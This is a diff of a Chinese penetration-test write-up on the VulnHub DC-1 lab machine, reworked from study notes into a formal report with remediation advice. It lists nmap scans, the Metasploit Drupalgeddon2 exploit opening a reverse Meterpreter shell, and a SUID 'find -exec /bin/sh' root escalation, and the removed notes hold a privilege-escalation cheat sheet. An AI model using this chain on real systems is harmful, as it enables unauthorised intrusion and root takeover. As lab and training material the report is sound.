@@ -1,38 +1,55 @@
-# DC-1 靶机渗透学习总结（2026.05.26）
+# DC-1 渗透测试报告
 
-## 一、任务目标
-- 从零开始部署 VulnHub DC-1 靶机
-- 实践信息收集、漏洞利用、提权、获取 Flag 的完整渗透流程
-- 巩固 Linux 提权知识（SUID、计划任务等）
+**测试人员**：贺寿国
+**测试日期**：2026年5月26日
+**目标系统**：DC-1 (IP: 192.168.129.130)
 
-## 二、环境准备
-- **靶机**：DC-1（VulnHub）
-- **攻击机**：Kali Linux（IP 192.168.129.129）
-- **网络模式**：NAT（靶机 IP 192.168.129.130）
+## 1. 摘要
 
-### 常见问题与解决
-- **OVA 导入失败**：VMware 报错 `Exception 0xc0000094` → 通过“更改硬件兼容性”为 Workstation 16.2.x 解决。
-- **无法扫描到靶机**：网络模式不一致 → 将 Kali 和 DC-1 都设置为 NAT 模式，并重启 VMware NAT 服务。
+本次测试针对 VulnHub DC-1 靶机进行渗透，成功获取系统 root 权限并读取最终 flag。主要利用路径为：端口扫描发现 Web 服务 → 识别 Drupal 7 CMS → 利用 Drupalgeddon2 漏洞获得初始 shell → 信息收集发现 SUID 程序 → 利用 /usr/bin/find 提权至 root → 获取 flag。靶机存在 CMS 未及时更新、SUID 权限配置不当等风险。
 
-## 三、信息收集（阶段一）
+## 2. 测试范围
 
-### 1. 主机发现与端口扫描
-```bash
-sudo nmap -sn 192.168.129.0/24        # 发现靶机 IP 192.168.129.130
-sudo nmap -sV -p 22,80,443,8080 192.168.129.130
+- **IP 地址**：192.168.129.130
+- **开放端口**：22 (SSH)、80 (HTTP)
+- **目标系统**：Debian GNU/Linux 7 (wheezy)，Drupal 7 CMS
+
+## 3. 测试方法与工具
+
+- **信息收集**：nmap, arp-scan
+- **Web 应用识别**：whatweb, 浏览器开发者工具
+- **漏洞利用**：Metasploit Framework (drupal_drupalgeddon2)
+- **Shell 操作**：python pty 交互式 shell
+- **提权利用**：find 命令 SUID 逃逸
+
+## 4. 漏洞发现与利用详情
+
+### 4.1 端口扫描与服务识别
+
+**操作**：
+
+bash
+
 ```
+nmap -sn 192.168.129.0/24     # 发现靶机 IP
+nmap -sV -p- 192.168.129.130  # 全端口扫描
+nmap -sV -p 22,80 192.168.129.130  # 服务版本探测
+```
+
+
 
 **结果**：
 
-- 22/tcp open OpenSSH 6.0p1 Debian 4+deb7u7
+- 22/tcp open ssh OpenSSH 6.0p1 Debian 4+deb7u7
+- 80/tcp open http Apache httpd 2.2.22 (Debian)
 
-- 80/tcp open Apache httpd 2.2.22 (Debian)
+**截图**：
 
-  ![image-20260526202213657](https://raw.githubusercontent.com/hsg1224/network/main/img/image-20260526202213657.png)
+![image-20260526202213657](https://raw.githubusercontent.com/hsg1224/network/main/img/image-20260526202213657.png)
 
-### 2. Web 服务识别
+### 4.2 Web 服务识别与 CMS 指纹
 
-访问 `http://192.168.129.130`，页面源码中显示：
+访问 `http://192.168.129.130`，查看页面源代码：
 
 html
 
@@ -40,143 +57,171 @@ html
 <meta name="Generator" content="Drupal 7 (http://drupal.org)">
 ```
 
-![image-20260526203324806](https://raw.githubusercontent.com/hsg1224/network/main/img/image-20260526203324806.png)
+
 
 确认 CMS 为 **Drupal 7**。
 
-### 3. 目录扫描（使用 gobuster）
+**截图**：
 
-bash
+![image-20260526203324806](https://raw.githubusercontent.com/hsg1224/network/main/img/image-20260526203324806.png)
 
-```
-gobuster dir -u http://192.168.129.130 -w /usr/share/wordlists/dirb/common.txt -t 50
-```
 
-![image-20260526204233278](https://raw.githubusercontent.com/hsg1224/network/main/img/image-20260526204233278.png)
 
-发现 /admin、robots.txt
 
-## 四、漏洞利用（阶段二）
 
-### 利用 Drupalgeddon2（CVE-2018-7600）获得初始 Shell
 
-#### 方法一：Metasploit（推荐）
+
+**分析**：Drupal 7 存在多个高危漏洞，其中 Drupalgeddon2 (CVE-2018-7600) 允许未授权远程代码执行，是最佳突破口。
+
+### 4.3 漏洞利用——Drupalgeddon2
+
+使用 Metasploit 框架加载漏洞模块：
 
 bash
 
 ```
 msfconsole
-use exploit/unix/webapp/drupal_drupalgeddon2
-set RHOSTS 192.168.129.130
-set RPORT 80
-set TARGETURI /
-run
+msf6 > use exploit/unix/webapp/drupal_drupalgeddon2
+msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set RHOSTS 192.168.129.130
+msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set RPORT 80
+msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set TARGETURI /
+msf6 exploit(unix/webapp/drupal_drupalgeddon2) > run
 ```
 
-![image-20260526212714582](https://raw.githubusercontent.com/hsg1224/network/main/img/image-20260526212714582.png)
 
-成功获得 meterpreter 会话，然后进入 shell：
+
+**执行结果**：
+
+text
+
+```
+[*] Started reverse TCP handler on 192.168.129.129:4444
+[*] Sending stage (42137 bytes) to 192.168.129.130
+[*] Meterpreter session 1 opened (192.168.129.129:4444 -> 192.168.129.130:42875)
+```
+
+
+
+获得 Meterpreter 会话后进入系统 shell：
 
 bash
 
 ```
 meterpreter > shell
 python -c 'import pty;pty.spawn("/bin/bash")'
-export TERM=xterm
+www-data@DC-1:/var/www$ whoami
+www-data
 ```
+
+
+
+**截图**：
 
 ![image-20260526212737818](https://raw.githubusercontent.com/hsg1224/network/main/img/image-20260526212737818.png)
 
-> 
+### 4.4 信息收集与 SUID 枚举
 
-## 五、信息收集（低权限 Shell）
-
-在 `www-data` 用户下执行：
+在 `www-data` 权限下进行信息收集：
 
 bash
 
 ```
-whoami          # www-data
-id              # uid=33(www-data) gid=33(www-data)
-uname -a        # Linux DC-1 3.2.0-6-486
-cat /etc/os-release   # Debian 7 (wheezy)
-find / -perm -4000 -type f 2>/dev/null   # 列出 SUID 文件
+www-data@DC-1:/var/www$ whoami
+www-data
+www-data@DC-1:/var/www$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@DC-1:/var/www$ uname -a
+Linux DC-1 3.2.0-6-486 #1 Debian 3.2.102-1 i686 GNU/Linux
+www-data@DC-1:/var/www$ cat /etc/os-release
+PRETTY_NAME="Debian GNU/Linux 7 (wheezy)"
 ```
+
+截图：
 
 ![image-20260526212855325](https://raw.githubusercontent.com/hsg1224/network/main/img/image-20260526212855325.png)
 
-**关键发现**：`/usr/bin/find` 具有 SUID 权限，可用于提权。
-
-## 六、提权至 root（阶段三）
-
-利用 SUID 的 `find` 命令：
+查找 SUID 文件：
 
 bash
 
 ```
-cd /tmp
-find . -exec /bin/sh \; -quit
+www-data@DC-1:/var/www$ find / -perm -4000 -type f 2>/dev/null
 ```
+
+**关键输出**：
+
+text
+
+```
+/usr/bin/find
+/usr/bin/procmail
+/usr/sbin/exim4
+/bin/mount
+/bin/ping
+/bin/su
+...
+```
+
+
+
+**分析**：`/usr/bin/find` 具有 SUID 权限，可在 GTFOBins 中找到利用方法。
+
+### 4.5 利用 SUID find 提权至 root
+
+bash
+
+```
+www-data@DC-1:/var/www$ cd /tmp
+www-data@DC-1:/tmp$ find . -exec /bin/sh \; -quit
+# whoami
+root
+# id
+uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)
+```
+
+
+
+**截图**：
 
 ![image-20260526212932376](https://raw.githubusercontent.com/hsg1224/network/main/img/image-20260526212932376.png)
 
-执行后提示符变为 `#`，确认提权成功：
+**原理**：`find` 命令被设置了 SUID 权限，其 `-exec` 参数会以文件所有者（root）的权限执行指定的命令，从而允许低权限用户生成 root shell。
+
+### 4.6 获取最终 flag
 
 bash
 
 ```
-whoami   # root
-id       # euid=0(root)
+# find / -name "flag*.txt" -type f 2>/dev/null
+/var/www/flag1.txt
+/home/flag4/flag4.txt
+/root/thefinalflag.txt
 ```
 
-![image-20260526213002657](https://raw.githubusercontent.com/hsg1224/network/main/img/image-20260526213002657.png)
-
-## 七、获取 Flag
-
-DC-1 共有 5 个 flag，本次成功获取以下 3 个：
-
-| Flag 文件                | 内容摘要                                                     |
-| :----------------------- | :----------------------------------------------------------- |
-| `/var/www/flag1.txt`     | `Every good CMS needs a config file - and so do you.`        |
-| `/home/flag4/flag4.txt`  | `Can you use this same method to find or access the flag in root?` |
-| `/root/thefinalflag.txt` | `Well done!!!! ... @DCAU7`                                   |
-
-> **说明**：flag2 和 flag3 未在本次任务中定位，可能位于数据库或需要额外交互。建议后续补充完整。
->
-> ![image-20260526213120893](https://raw.githubusercontent.com/hsg1224/network/main/img/image-20260526213120893.png)
-
-## 八、今日练习完成清单
-
-- 下载并导入 DC-1 靶机，解决 VMware 兼容性问题
-- 使用 nmap 发现靶机并扫描端口服务
-- 识别 Drupal 7 版本
-- 利用 Drupalgeddon2 获得 www-data shell
-- 执行信息收集命令，发现 SUID find
-- 利用 find 提权至 root
-- 读取 3 个 flag 文件
-
-## 九、学习要点总结
-
-1. **虚拟机网络配置**：确保靶机与攻击机处于同一虚拟网络（NAT / 桥接），否则无法扫描。
-2. **信息收集的重要性**：通过 `nmap` 和 `gobuster` 发现服务版本和隐藏路径，为漏洞利用提供依据。
-3. **漏洞利用工具选择**：Metasploit 模块稳定可靠；手动脚本适合理解细节。
-4. **SUID 提权**：`find` 是最常见的可利用 SUID 命令之一，`-exec` 可执行任意命令。
-5. **Flag 存储位置**：DC-1 的 flag 分布在 `/var/www`、`/home/flag4`、`/root`，以及可能的数据库或用户目录。
 
 
+bash
 
 ```
-## Linux 提权速查（2026.05.27）
-
-### 1. SUID 提权
-- 查找：`find / -perm -4000 -type f 2>/dev/null`
-- 利用（如 find）：`find . -exec /bin/sh \; -quit`
-
-### 2. Sudo 提权
-- 查看权限：`sudo -l`
-- 利用（如 find）：`sudo find . -exec /bin/sh \; -quit`
-
-### 3. Cron 提权
-- 查看计划任务：`cat /etc/crontab` 或 `ls -la /etc/cron*`
-- 如果脚本可写，插入反弹 shell。
+# cat /root/thefinalflag.txt
 ```
+
+
+
+**截图**：
+
+![image-20260526213120893](https://raw.githubusercontent.com/hsg1224/network/main/img/image-20260526213120893.png)
+
+## 5. 风险评级与修复建议
+
+| 漏洞点                         | 风险等级 | 修复建议                                                     |
+| :----------------------------- | :------- | :----------------------------------------------------------- |
+| Drupal 7 未及时更新            | 严重     | 立即升级 Drupal 至最新安全版本，Drupal 7 已停止官方支持，建议迁移至 Drupal 9/10 |
+| `/usr/bin/find` 具有 SUID 权限 | 高       | 审计所有 SUID 程序，移除非必需程序的 SUID 权限。`find` 不应具备 SUID 权限 |
+| 配置文件 `settings.php` 可读   | 中       | 限制配置文件权限为 440，确保 Web 进程无法直接读取敏感凭据    |
+| 数据库凭据明文存储             | 中       | 使用环境变量存储敏感配置，避免硬编码在文件中                 |
+| 内核版本过旧 (3.2.0)           | 中       | 制定系统补丁管理策略，及时更新内核与安全补丁                 |
+
+## 6. 结论
+
+DC-1 靶机存在多个典型安全配置缺陷，攻击者可通过组合漏洞（CMS 未更新 + SUID 权限滥用）获得完整系统控制权。本次测试验证了从 Web 漏洞入手，逐步提权至 root 的完整渗透路径。建议按照上表进行修复，重点优先升级 CMS 系统和审计 SUID 权限配置。
